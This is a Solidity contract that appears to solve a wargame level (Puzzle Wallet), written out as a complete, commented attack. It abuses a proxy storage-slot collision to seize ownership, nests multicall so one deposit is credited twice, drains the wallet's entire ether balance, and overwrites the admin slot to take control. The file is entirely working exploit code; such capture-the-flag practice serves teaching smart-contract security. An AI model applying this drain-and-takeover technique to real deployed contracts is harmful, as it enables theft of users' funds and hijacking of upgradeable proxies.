//SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;

import "./Level.sol";

contract Attacker {

    PuzzleProxy px;
    PuzzleWallet pxWallet;

    constructor(address _px) payable {
        px = PuzzleProxy(payable(_px));
        pxWallet = PuzzleWallet(_px);
    }

    function attack(address _newOwner) external {
        //Make attacker the owner of impl due to incorrect storage layout
        px.proposeNewAdmin(address(this));

        //Add yourself to the whitelist 
        pxWallet.addToWhitelist(address(this));


        //We need to increase our balance twice by paying only once. To do that, we will abuse the multicall function by
        //nesting a multicall in another multicall

        bytes memory deposit = abi.encodeWithSelector(PuzzleWallet.deposit.selector); 
        bytes[] memory data = new bytes[](2);
        //data[0] - call the deposit function
        data[0] = deposit;
        
        //multicalldata - the calldata for a nested multicall function
        bytes[] memory multicalldata = new bytes[](1);
        multicalldata[0] = deposit;

        //data[1] - call multicall which is going to call deposit again
        data[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, multicalldata);

        uint256 amountToDeposit = address(px).balance;
        pxWallet.multicall{value:amountToDeposit}(data);

        //Withdraw the balance
        pxWallet.execute(address(this), address(px).balance, bytes("0x0"));

        //Now we can change the owner by encoding the new owner in a uint256 (again due to bad storage layout)
        uint256 newOwner = uint256(uint160(_newOwner));
        pxWallet.setMaxBalance(newOwner);
    }


    fallback() external payable {}


}